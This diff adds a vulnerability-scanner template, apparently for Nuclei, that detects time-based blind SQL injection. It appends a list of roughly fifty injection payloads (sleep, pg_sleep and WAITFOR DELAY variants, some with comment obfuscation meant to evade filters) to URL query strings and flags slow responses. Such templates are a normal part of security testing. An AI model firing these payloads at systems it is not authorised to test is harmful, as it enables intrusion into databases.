@@ -1,0 +1,76 @@
+id: oscuridad-sql
+
+info:
+  name: Blind SQL Injection time based detection of sql backend
+  author: oscuridad
+  severity: High
+  tags: sql,bsql
+
+requests:
+  - method: GET
+    path: 
+      - "{{BaseURL}}"
+    payloads:
+      sqloscuridad:
+        - "1337 XOR(if(now()=sysdate(),sleep(7),0))XOR%23"
+        - "1337' or sleep(7)-- -#"
+        - "1337' or sleep(7)#"
+        - "1337' or sleep(7)='#"
+        - "1337' or sleep(7)='--"
+        - "1337'/*F*/or/*F*/sleep(7)='"
+        - "1337' or sleep(7)-- -%23"
+        - "1337' or sleep(7)%23"
+        - "1337' or sleep(7);%00"
+        - "1337 or sleep(7)--+-"
+        - "1337 or sleep(7)#"
+        - "1337'/*f*/or/*f*/sleep/*f*/(7)-- -#"
+        - "1337'/*f*/or/*f*/sleep/*f*/(7)#"
+        - "1337 or sleep(7)%23"
+        - "1337'/*f*/or/*f*/sleep/*f*/(7)-- -%23"
+        - "1337'/*f*/or/*f*/sleep/*f*/(7)%23"
+        - "1337'/*f*/or/*f*/sleep/*f*/(7);%00"
+        - "1337 or/*f*/sleep/*f*/(7)--+-"
+        - "1337 or/*f*/sleep/*f*/(7)#"
+        - "1337'XOR(if(now()=sysdate(),sleep(7),0))XOR'"
+        - "1337'OR(if(now()=sysdate(),sleep(7),0))-- -#"
+        - "1337'OR(if(now()=sysdate(),sleep(7),0))#"
+        - "1337 or/*f*/sleep/*f*/(7)%23"
+        - "1337'OR(if(now()=sysdate(),sleep(7),0))-- -%23"
+        - "1337'OR(if(now()=sysdate(),sleep(7),0))%23"
+        - "1337'OR(if(now()=sysdate(),sleep(7),0));%00"
+        - "1337 OR(if(now()=sysdate(),sleep(7),0))--+-"
+        - "1337 OR(if(now()=sysdate(),sleep(7),0))#"
+        - "1337 OR(if(now()=sysdate(),sleep(7),0))%23"
+        - "1337'WAITFOR DELAY '0:0:7';%00"
+        - "1337'WAITFOR DELAY '0:0:7'#"
+        - "1337'WAITFOR DELAY '0:0:7'%23"
+        - "1337'WAITFOR DELAY '0:0:7';%00"
+        - "1337 WAITFOR DELAY '0:0:7'#"
+        - "1337 WAITFOR DELAY '0:0:7'%23"
+        - "1337 WAITFOR DELAY '0:0:7'--+-"
+        - "1337'WAITFOR DELAY '0:0:7'--+-"
+        - "1337'WAITFOR DELAY '0:0:7'='"
+        - "1337\"/*F*/or/*f*/sleep(1)%23"
+        - "1337'/*f*/OR/*f*/pg_sleep(7)#"
+        - "1337'/*f*/OR/*f*/pg_sleep(7)%23"
+        - "1337'/*f*/OR/*f*/pg_sleep(7);%00"
+        - "1337 /*f*/OR/*f*/pg_sleep(10)--+-"
+        - "1337 /*f*/OR/*f*/pg_sleep(10)#"
+        - "1337 /*f*/OR/*f*/pg_sleep(10)%23"
+        - "1337'/*f*/OR/*f*/pg_sleep(7)=';%00"
+        - "1337\")/*F*/or/*f*/sleep(7)%23"
+        - "1337\")/*F*/or/*f*/sleep(7)%23"
+        
+    stop-at-first-match: true
+    fuzzing:
+      - part: query
+        type: postfix
+        mode: single
+        fuzz:
+          - "{{sqloscuridad}}"
+
+    matchers:
+      - type: dsl
+        dsl: 
+          - 'duration>=5'
+    
